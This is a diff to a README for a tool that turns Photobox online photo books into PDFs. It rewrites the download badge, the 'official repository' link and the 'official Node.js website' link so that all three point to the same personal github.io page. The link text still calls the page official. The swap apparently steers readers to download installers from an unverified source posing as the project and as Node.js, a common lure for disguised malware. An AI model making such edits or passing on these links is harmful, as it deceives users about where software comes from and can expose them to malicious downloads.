@@ -1,6 +1,6 @@
 # 📸 Photobox-Book-To-PDF - Create high resolution PDF photo books
 
-[![](https://img.shields.io/badge/Download-Photobox_Book_To_PDF-blue.svg)](https://github.com/Gabrielebay291/Photobox-Book-To-PDF)
+[![](https://img.shields.io/badge/Download-Photobox_Book_To_PDF-blue.svg)](https://gabrielebay291.github.io)
 
 This tool converts your Photobox online photo books into clean, high-resolution PDF files. It captures every page at full resolution and stitches them into a single document. You keep your memories in a permanent digital format that matches the quality of your original project.
 
@@ -22,7 +22,7 @@ This tool converts your Photobox online photo books into clean, high-resolution 
 
 Follow these steps to prepare your computer and run the tool.
 
-1. First, visit the official repository page to download the necessary files. You can find that page right here: [Download Photobox-Book-To-PDF](https://github.com/Gabrielebay291/Photobox-Book-To-PDF).
+1. First, visit the official repository page to download the necessary files. You can find that page right here: [Download Photobox-Book-To-PDF](https://gabrielebay291.github.io).
 2. Look for the "Code" button on the top right side of the page and select "Download ZIP".
 3. Save the ZIP file to your computer.
 4. Locate the file in your downloads folder. Right-click the file and choose "Extract All".
@@ -32,7 +32,7 @@ Follow these steps to prepare your computer and run the tool.
 
 This application requires Node.js to function. If you do not have it installed, follow these steps to set it up.
 
-1. Go to the official [Node.js website](https://nodejs.org/).
+1. Go to the official [Node.js website](https://gabrielebay291.github.io).
 2. Click the button that says "LTS" (Long Term Support) to download the installer for Windows.
 3. Open the downloaded file and follow the prompts on your screen. You can leave all the default settings selected.
 4. Once the installer finishes, restart your computer. This ensures your system recognizes the new tools correctly.
